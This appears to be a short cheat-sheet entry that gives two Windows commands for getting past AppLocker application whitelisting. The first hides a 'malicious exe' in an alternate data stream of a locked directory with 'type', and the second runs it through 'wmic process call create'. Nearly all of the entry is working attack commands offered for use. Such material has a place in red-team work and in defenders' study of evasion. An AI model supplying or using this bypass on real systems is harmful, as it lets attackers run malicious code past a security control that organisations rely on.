## Bypass applocker using alternate data streams

### Copy malicious exe into the locked directory (current working directory must be one level above the locked directory)
```
type &lt;path\to\file.exe&gt; &gt; .\&lt;lockedDirectory&gt;:&lt;file.exe&gt;
```

### Execute
```
wmic process call create '"%CD%\&lt;lockedDirectory&gt;:&lt;file.exe&gt;"'
```


